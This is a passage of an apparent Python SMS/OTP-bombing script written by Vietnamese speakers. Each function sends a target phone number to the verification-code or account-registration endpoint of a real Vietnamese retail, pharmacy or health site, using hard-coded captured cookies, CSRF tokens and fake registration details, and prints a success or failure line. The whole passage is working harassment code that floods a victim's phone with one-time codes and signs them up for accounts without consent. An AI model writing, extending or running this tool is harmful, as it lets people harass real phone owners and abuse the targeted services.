        'affiliate_content': '%7B%22time_stamp%22%3A1721799113%2C%22source%22%3A%22ggads%22%2C%22traffic_id%22%3A%22%22%2C%22traffic_channel%22%3Anull%2C%22utm_medium%22%3A%22search%22%2C%22utm_campaign%22%3A%22VN_GG_SEARCH_BRANDKEY%22%2C%22url%22%3A%22https%3A%5C%2F%5C%2Fwww.coolmate.me%22%2C%22http_referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%2C%22remote_addr%22%3A%22103.161.22.162%22%2C%22http_user_agent%22%3A%22Mozilla%5C%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%5C%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%5C%2F126.0.0.0%20Safari%5C%2F537.36%20OPR%5C%2F112.0.0.0%22%2C%22utm_term%22%3A%2221084599217-163380422121-coolmate%22%2C%22utm_content%22%3A%22693188749431%22%2C%22gclid%22%3A%22CjwKCAjwqf20BhBwEiwAt7dtdUAEePAiTCu24BSCR3YUoTJOreWQgR7EkSIRH1jkjyecvBTaOy7z4BoCgO0QAvD_BwE%22%7D',
        'g_state': '{"i_p":1722403917652,"i_l":3}',
        'XSRF-TOKEN': 'eyJpdiI6IlwvTVY0K1l0dWJ6VEZsaDl2MGlxeFVnPT0iLCJ2YWx1ZSI6IkxUWmtvXC9JQUFwdXNyODB3NGhBUDBldEhNUkZsTEhQckdiXC9DeDhmUzdOR0FYN1Zyamc2NzNsRTdIVTBodDFHQSIsIm1hYyI6ImExODQ1MTg0OTViZjFiYTlmZDZhYjlkOTIzZDdhZTVkNjkxNDllZjNiYTZmMTUyYzI4Mjc5ZjhhOTU0NmJjMzMifQ%3D%3D',
        'laravel_session': 'eyJpdiI6IngybG1TTFN6eGM2dzVxczQ4ekdFUEE9PSIsInZhbHVlIjoiWndnZEQyeUlKeHREXC9YXC90WXMwXC9Yd3g1N3JTczcwdUdESFM3d1wvN3dXdVdoZEVyZm1FWVVjSXFwNWJVd3EzZEwiLCJtYWMiOiI2YjQ4ZTY5NTk0MGNmMDM5YTZiOTgzN2QxZTRjMmYyODBiNTk1YjFhN2VjMzVhNGE5MTlkMWUwNWRiMjMyMjE1In0%3D',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        # 'cookie': 'device_token=597f946e29e835d88f56392f40ea75c3; box_token=9dbb29f1bd9e93ef4a5f8468ff0b5618; cart_quantity=0; active-voucher1=true; affiliate_content=%7B%22time_stamp%22%3A1721799113%2C%22source%22%3A%22ggads%22%2C%22traffic_id%22%3A%22%22%2C%22traffic_channel%22%3Anull%2C%22utm_medium%22%3A%22search%22%2C%22utm_campaign%22%3A%22VN_GG_SEARCH_BRANDKEY%22%2C%22url%22%3A%22https%3A%5C%2F%5C%2Fwww.coolmate.me%22%2C%22http_referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%2C%22remote_addr%22%3A%22103.161.22.162%22%2C%22http_user_agent%22%3A%22Mozilla%5C%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%5C%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%5C%2F126.0.0.0%20Safari%5C%2F537.36%20OPR%5C%2F112.0.0.0%22%2C%22utm_term%22%3A%2221084599217-163380422121-coolmate%22%2C%22utm_content%22%3A%22693188749431%22%2C%22gclid%22%3A%22CjwKCAjwqf20BhBwEiwAt7dtdUAEePAiTCu24BSCR3YUoTJOreWQgR7EkSIRH1jkjyecvBTaOy7z4BoCgO0QAvD_BwE%22%7D; g_state={"i_p":1722403917652,"i_l":3}; XSRF-TOKEN=eyJpdiI6IlwvTVY0K1l0dWJ6VEZsaDl2MGlxeFVnPT0iLCJ2YWx1ZSI6IkxUWmtvXC9JQUFwdXNyODB3NGhBUDBldEhNUkZsTEhQckdiXC9DeDhmUzdOR0FYN1Zyamc2NzNsRTdIVTBodDFHQSIsIm1hYyI6ImExODQ1MTg0OTViZjFiYTlmZDZhYjlkOTIzZDdhZTVkNjkxNDllZjNiYTZmMTUyYzI4Mjc5ZjhhOTU0NmJjMzMifQ%3D%3D; laravel_session=eyJpdiI6IngybG1TTFN6eGM2dzVxczQ4ekdFUEE9PSIsInZhbHVlIjoiWndnZEQyeUlKeHREXC9YXC90WXMwXC9Yd3g1N3JTczcwdUdESFM3d1wvN3dXdVdoZEVyZm1FWVVjSXFwNWJVd3EzZEwiLCJtYWMiOiI2YjQ4ZTY5NTk0MGNmMDM5YTZiOTgzN2QxZTRjMmYyODBiNTk1YjFhN2VjMzVhNGE5MTlkMWUwNWRiMjMyMjE1In0%3D',
        'origin': 'https://www.coolmate.me',
        'priority': 'u=1, i',
        'referer': 'https://www.coolmate.me/?utm_source=ggads&utm_medium=search&utm_campaign=vn_gg_search_brandkey&utm_content=brandkey&utm_source=ggads&utm_medium=search&utm_campaign=VN_GG_SEARCH_BRANDKEY&utm_term=21084599217-163380422121-coolmate&utm_content=693188749431&gad_source=1&gclid=CjwKCAjwqf20BhBwEiwAt7dtdUAEePAiTCu24BSCR3YUoTJOreWQgR7EkSIRH1jkjyecvBTaOy7z4BoCgO0QAvD_BwE',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-csrf-token': 'pF5HMuGZ6qEQ6EudK1Lyvj8mc5zZmXvzlDQaCJnQ',
    }

    json_data = {
        'fullname': 'tran quoc ujy',
        'email': 'quadeptrai@gmail.com',
        'phone': phone,
        'password': '123123aA@',
        'ajax': True,
    }

    try:
        response = requests.post('https://www.coolmate.me/account/register', cookies=cookies, headers=headers, json=json_data, timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("COOLMATE | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("COOLMATE | TRẠNG THÁI : Thất Bại Fuck")
        


def mioto(phone):
    cookies = {
        '_vid': 'Eiw8L9Ir5m56SIn0',
        '_hv': '5d629960ddf467c1d7a29afc5d3a3c1436b2c9b1680d1239025b45d43aabf046',
        '_mid': 'ul2e3a.Uj8WZEQYS_JNWRrU-iopyXPAY6FobQnefvd7bOpylODI9N-3P1zD-Nd9uVzbU8Pd1l0b4sqwdsAuaJwh8IMR7Q',
        '_hs': '9d68724d1934e72230e831e5c1b302f3a6210c4b25f158a4f1a111bed851b7e8',
    }

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        # 'content-length': '0',
        # 'cookie': '_vid=Eiw8L9Ir5m56SIn0; _hv=5d629960ddf467c1d7a29afc5d3a3c1436b2c9b1680d1239025b45d43aabf046; _mid=ul2e3a.Uj8WZEQYS_JNWRrU-iopyXPAY6FobQnefvd7bOpylODI9N-3P1zD-Nd9uVzbU8Pd1l0b4sqwdsAuaJwh8IMR7Q; _hs=9d68724d1934e72230e831e5c1b302f3a6210c4b25f158a4f1a111bed851b7e8',
        'origin': 'https://www.mioto.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.mioto.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    params = {
        'phone': phone,
        'action': '1',
        'otpBy': '0',
    }

    try:
        response = requests.post('https://accounts.mioto.vn/mapi/phone/otp/gen', params=params, cookies=cookies, headers=headers, timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("MIOTO | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("MIOTO | TRẠNG THÁI : Thất Bại Fuck")



def avakids(phone):
    cookies = {
        'TBMCookie_3209819802479625248': '913589001721792014a7Mg2hhHa7pbVh+oCTfpJpA1Sks=',
        '___utmvm': '###########',
        '.AspNetCore.Antiforgery.Igz9_hL99hw': 'CfDJ8KCJ5TMsrhBIolL3aLeC8tgUGuuieZHIZ2cXAzdXCV0weIQMKIdaXaKHqWlFAxVrE5Mmx7MjY4DHsH057lcX75hawBGh2AFjqWR5v0sbzcTEpe213M95jEGw6a_EOBoGklFNPeg8y-tDvm0YJ2HFwq8',
        'CookiesUserId': 'f717fb39-aca2-447e-86d8-43353b354242',
        'MWG_CART_ID': 'e73eec56f3bc43c59790',
        'MWG_CART_HAVE_PRODUCT': '',
        'MWG_PRODUCT_BASIC_DB': 'm0PtwM5f7zfBNFFqjl2heNWXVnT5cDCxQupf6Di11B_JfPHbQCuwFQ--',
        'MWG_CART_SS_17': 'CfDJ8MR0DtoU1ltDp5DLN27lzqZ4YhPTRmbBDljODDlEJnUlV%2Bee2hGsJqDZO95ajUvteyCwhjJP5FqrwOBLYdppxI1k%2BvbqLYuJqF62Njl7iXdv%2FRsd8qq0AaBMkJsEnw9pRCgyeA16UEog6AShjid8R4ag1QxbIiNtqzkOaRXKukbC',
        'X-CSRF-TOKEN-MwgCart17': 'CfDJ8MR0DtoU1ltDp5DLN27lzqaRiOuypmIDAgn58TM-0T-pk1i5_VodJPnd_mdrIBLnjHCBZswioCNqDgvvdawVVAaU011jYh0_Aur2wMBODvZJ_FbFhM3Jp5a91Pjw5cQCd9JokvXAR-lGVygSJJGFa3k',
        'SvID': 'blki218|ZqB2J|ZqB2E',
        'DMX_Personal': '%7B%22UID%22%3A%22DMX%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D',
        'mwgngxpv': '3',
        'BONUSCART_CK': 'IoHfQ0np2zMfLJWaplKPR%2FdZVOKMK3Na4qz7P4lNgFPPpBjWeGmR9dYYMle3cbcHwmpI9sqRBZwtPWHomp7phw--',
        '.AspNetCore.Antiforgery.dGH04W8MKvk': 'CfDJ8LNt9duCvo5JgR90L8go8A6MNFRuMLytIZWVy85L0q2oLN1xh4JosZKHzuAuZ8EGmvSLazpfZMG9yIOdNtCbLLMJUI1gS9Toaz9Eu2PuYCaiiNZtT_jy4EPlOsYNyS7SalhePWKxBZTjqaqdbfVAZcE',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': 'TBMCookie_3209819802479625248=913589001721792014a7Mg2hhHa7pbVh+oCTfpJpA1Sks=; ___utmvm=###########; .AspNetCore.Antiforgery.Igz9_hL99hw=CfDJ8KCJ5TMsrhBIolL3aLeC8tgUGuuieZHIZ2cXAzdXCV0weIQMKIdaXaKHqWlFAxVrE5Mmx7MjY4DHsH057lcX75hawBGh2AFjqWR5v0sbzcTEpe213M95jEGw6a_EOBoGklFNPeg8y-tDvm0YJ2HFwq8; CookiesUserId=f717fb39-aca2-447e-86d8-43353b354242; MWG_CART_ID=e73eec56f3bc43c59790; MWG_CART_HAVE_PRODUCT=; MWG_PRODUCT_BASIC_DB=m0PtwM5f7zfBNFFqjl2heNWXVnT5cDCxQupf6Di11B_JfPHbQCuwFQ--; MWG_CART_SS_17=CfDJ8MR0DtoU1ltDp5DLN27lzqZ4YhPTRmbBDljODDlEJnUlV%2Bee2hGsJqDZO95ajUvteyCwhjJP5FqrwOBLYdppxI1k%2BvbqLYuJqF62Njl7iXdv%2FRsd8qq0AaBMkJsEnw9pRCgyeA16UEog6AShjid8R4ag1QxbIiNtqzkOaRXKukbC; X-CSRF-TOKEN-MwgCart17=CfDJ8MR0DtoU1ltDp5DLN27lzqaRiOuypmIDAgn58TM-0T-pk1i5_VodJPnd_mdrIBLnjHCBZswioCNqDgvvdawVVAaU011jYh0_Aur2wMBODvZJ_FbFhM3Jp5a91Pjw5cQCd9JokvXAR-lGVygSJJGFa3k; SvID=blki218|ZqB2J|ZqB2E; DMX_Personal=%7B%22UID%22%3A%22DMX%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D; mwgngxpv=3; BONUSCART_CK=IoHfQ0np2zMfLJWaplKPR%2FdZVOKMK3Na4qz7P4lNgFPPpBjWeGmR9dYYMle3cbcHwmpI9sqRBZwtPWHomp7phw--; .AspNetCore.Antiforgery.dGH04W8MKvk=CfDJ8LNt9duCvo5JgR90L8go8A6MNFRuMLytIZWVy85L0q2oLN1xh4JosZKHzuAuZ8EGmvSLazpfZMG9yIOdNtCbLLMJUI1gS9Toaz9Eu2PuYCaiiNZtT_jy4EPlOsYNyS7SalhePWKxBZTjqaqdbfVAZcE',
        'Origin': 'https://www.avakids.com',
        'Referer': 'https://www.avakids.com/lich-su-mua-hang/dang-nhap',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'phoneNumber': phone,
        'isReSend': 'false',
        'sendOTPType': '1',
        '__RequestVerificationToken': 'CfDJ8LNt9duCvo5JgR90L8go8A4qec6je7UJneAEXpEnc1-pqL-ZhM0205u4tpJk_DIjUdFs6h3cKTmiajRZTuKWWa10Jc_6AaKkwS6nVuOhbRpi7x89B9Bqxn78GuIW1vTEVRF-pJchKrCm2KbNOqG_1Bs',
    }

    try:
        response = requests.post(
            'https://www.avakids.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
            cookies=cookies,
            headers=headers,
            data=data,
            timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("AVAKIDS | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("AVAKIDS | TRẠNG THÁI : Thất Bại Fuck")



def giathuoctot(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://giathuoctot.com',
        'priority': 'u=1, i',
        'referer': 'https://giathuoctot.com/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'phoneNo': phone,
    }

    try:
        response = requests.post('https://api.giathuoctot.com/user/otp', headers=headers, json=json_data, timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("GIATHUOCTOT | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("GIATHUOCTOT | TRẠNG THÁI : Thất Bại Fuck")



def medigozl(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://www.medigoapp.com',
        'priority': 'u=1, i',
        'referer': 'https://www.medigoapp.com/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    params = {
        'from': 'ZALO',
    }

    json_data = {
        'phone': phone,
    }

    try:
        response = requests.post('https://auth.medigoapp.com/prod/getOtp', params=params, headers=headers, json=json_data, timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("MEDIGOZL | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("MEDIGOZL | TRẠNG THÁI : Thất Bại Fuck")



def pharmartzl(phone):
    cookies = {
        'bppsession2021': 'ms0ocs045k27kqmte9sddlq122054ifo',
        'isAT': '0',
        'viteexConfig': '%7B%22app_id%22%3A%22WmGeN7P4Kl%22%2C%22app_domain%22%3A%22https%3A//www.pharmart.vn/%22%2C%22app_status%22%3A10%2C%22public_key%22%3A%22BBFdWlBvcdt2ipHo2GqJbF8I3262KrNlAvDV1HOCLOH4Ve3etJCu-HGMzhxoQWTQ2DCa-XlF--Lr-MjjXIlgNyQ%22%2C%22not_ask_allow_in_day%22%3A1%2C%22alwaysSubcribe%22%3A0%2C%22is_track_reload_url%22%3A0%2C%22max_receive%22%3A0%2C%22notif_welcome%22%3A%5B%5D%7D',
        'mp_sid': '1721792970118.5579',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'bppsession2021=ms0ocs045k27kqmte9sddlq122054ifo; isAT=0; viteexConfig=%7B%22app_id%22%3A%22WmGeN7P4Kl%22%2C%22app_domain%22%3A%22https%3A//www.pharmart.vn/%22%2C%22app_status%22%3A10%2C%22public_key%22%3A%22BBFdWlBvcdt2ipHo2GqJbF8I3262KrNlAvDV1HOCLOH4Ve3etJCu-HGMzhxoQWTQ2DCa-XlF--Lr-MjjXIlgNyQ%22%2C%22not_ask_allow_in_day%22%3A1%2C%22alwaysSubcribe%22%3A0%2C%22is_track_reload_url%22%3A0%2C%22max_receive%22%3A0%2C%22notif_welcome%22%3A%5B%5D%7D; mp_sid=1721792970118.5579',
        'origin': 'https://www.pharmart.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.pharmart.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': phone,
        'type': 'zalo',
    }

    try:
        response = requests.post('https://www.pharmart.vn/send-otp', cookies=cookies, headers=headers, data=data, timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("PHARMARTZL | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("PHARMARTZL | TRẠNG THÁI : Thất Bại Fuck")



def pharmartsms(phone):
    cookies = {
        'bppsession2021': 'ms0ocs045k27kqmte9sddlq122054ifo',
        'isAT': '0',
        'viteexConfig': '%7B%22app_id%22%3A%22WmGeN7P4Kl%22%2C%22app_domain%22%3A%22https%3A//www.pharmart.vn/%22%2C%22app_status%22%3A10%2C%22public_key%22%3A%22BBFdWlBvcdt2ipHo2GqJbF8I3262KrNlAvDV1HOCLOH4Ve3etJCu-HGMzhxoQWTQ2DCa-XlF--Lr-MjjXIlgNyQ%22%2C%22not_ask_allow_in_day%22%3A1%2C%22alwaysSubcribe%22%3A0%2C%22is_track_reload_url%22%3A0%2C%22max_receive%22%3A0%2C%22notif_welcome%22%3A%5B%5D%7D',
        'mp_sid': '1721792970118.5579',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'bppsession2021=ms0ocs045k27kqmte9sddlq122054ifo; isAT=0; viteexConfig=%7B%22app_id%22%3A%22WmGeN7P4Kl%22%2C%22app_domain%22%3A%22https%3A//www.pharmart.vn/%22%2C%22app_status%22%3A10%2C%22public_key%22%3A%22BBFdWlBvcdt2ipHo2GqJbF8I3262KrNlAvDV1HOCLOH4Ve3etJCu-HGMzhxoQWTQ2DCa-XlF--Lr-MjjXIlgNyQ%22%2C%22not_ask_allow_in_day%22%3A1%2C%22alwaysSubcribe%22%3A0%2C%22is_track_reload_url%22%3A0%2C%22max_receive%22%3A0%2C%22notif_welcome%22%3A%5B%5D%7D; mp_sid=1721792970118.5579',
        'origin': 'https://www.pharmart.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.pharmart.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': phone,
        'type': 'sms',
    }

    try:
        response = requests.post('https://www.pharmart.vn/send-otp', cookies=cookies, headers=headers, data=data, timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("PHARMARTSMS | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("PHARMARTSMS | TRẠNG THÁI : Thất Bại Fuck")



def medigosms(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://www.medigoapp.com',
        'priority': 'u=1, i',
        'referer': 'https://www.medigoapp.com/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'phone': phone,
    }

    try:
        response = requests.post('https://auth.medigoapp.com/prod/getOtp', headers=headers, json=json_data, timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("MEDIGOSMS | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("MEDIGOSMS | TRẠNG THÁI : Thất Bại Fuck")



def jiohealth(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'app-location': 'VN',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://pharmacy.jiohealth.com',
        'priority': 'u=1, i',
        'referer': 'https://pharmacy.jiohealth.com/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    params = {
        'userID': '1647648',
        'token': '3ca29173-07f7-48c1-ad0f-68f1a460fb38',
        'phoneNumber': phone,
        'phoneCountryID': '6',
        'loginAccountTypeID': '0',
        'isChangePhone': '0',
    }

    data = '{}'

    try:
        response = requests.post(
            'https://prod.jiohealth.com:8443/JioPharmacy/rest/jio/sendSMSPhoneVerification',
            params=params,
            headers=headers,
            data=data,
            timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("JIOHEALTH | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("JIOHEALTH | TRẠNG THÁI : Thất Bại Fuck")



def ddmevabereg(phone):
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Origin': 'https://dinhduongmevabe.com.vn',
        'Referer': 'https://dinhduongmevabe.com.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'userType': 'BabySitter',
        'provinceId': 1,
        'password': '123123aA@',
        'fullName': 'kcoo ten',
        'authenticationMode': 'Internal',
        'socialUserId': '',
        'socialToken': '',
        'phoneNumber': phone,
    }

    try:
        response = requests.post('https://api.dinhduongmevabe.com.vn/api/User/Register', headers=headers, json=json_data, timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("DDMEVABE REG | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("DDMEVABE REG | TRẠNG THÁI : Thất Bại Fuck")



def ddmevabe(phone):
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        # 'Content-Length': '0',
        'Origin': 'https://dinhduongmevabe.com.vn',
        'Referer': 'https://dinhduongmevabe.com.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    params = {
        'userName': phone,
    }

    try:
        response = requests.post('https://api.dinhduongmevabe.com.vn/api/User/GetVerifyPhoneNumberCode', params=params, headers=headers, timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("DDMEVABE | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("DDMEVABE | TRẠNG THÁI : Thất Bại Fuck")



def nhathuocankhang(phone):
    cookies = {
        '___utmvm': '###########',
        '.AspNetCore.Antiforgery.PgYZnA9bRvk': 'CfDJ8MYaQjD04aBHj9meZl7eRqI3A2HboqNnhlow3nIbtSN1KebuCGK6Cc6IuNcfibOGjCM8Fz5YBSZbkIvW3ggg0LhTlWWOaTsLCwIM_9Zd3fdeEQuEjuLde5-WANEX1rQLaVVWdWxnFBWUqvXyCPq9PL8',
